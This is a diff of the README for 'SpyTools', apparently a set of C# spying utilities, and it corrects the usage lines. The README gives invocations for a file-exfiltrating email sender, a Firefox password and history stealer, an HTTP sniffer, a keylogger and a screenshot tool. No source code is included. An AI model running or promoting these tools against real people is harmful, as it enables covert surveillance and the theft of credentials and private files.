@@ -4,10 +4,9 @@ SpyTools is a collection of little tools wirtten in C# .Net 2.0, usefull to spy 
 ### EmailSender
 Get all files with some extensions in the current path, and send an email attaching them.
 ```
-EmailSender.exe "server.com" "user@server.com" "password" "from@domain.com" "FromName" "to@domain.com" "Subject" "Body" 
-"jpg,txt,png"
+EmailSender.exe "server.com" "user@server.com" "password" "from@domain.com" "FromName" "to@domain.com" "Subject" "Body" "jpg,txt,png"
 ```
-##```# FoxyStealer
+### FoxyStealer
 Copy to the current path, all firefox database and conifg files, for each profile. You can get the history or the passwords saved form them.
 ```
 FoxyStealer.exe
@@ -15,12 +14,12 @@ FoxyStealer.exe
 ### HTTPSniffer
 Start to capture all HTTP traffic, and flush them into a txt file.
 ```
-HTTPSniffer.exe ["OutputFileName" NumericIntervalToFlushTrafficToDisk]
+HTTPSniffer.exe ["OutputFileName"] [NumericIntervalToFlushTrafficToDisk]
 ```
 ### Keylogger
 Start to capture all keys, and flush them into a file.
 ```
-Keylogger.exe ["OutputFileName" NumericIntervalToFlushKeysToDisk]
+Keylogger.exe ["OutputFileName"] [NumericIntervalToFlushKeysToDisk]
 ```
 ### Printscreen
 Take a screenshot.
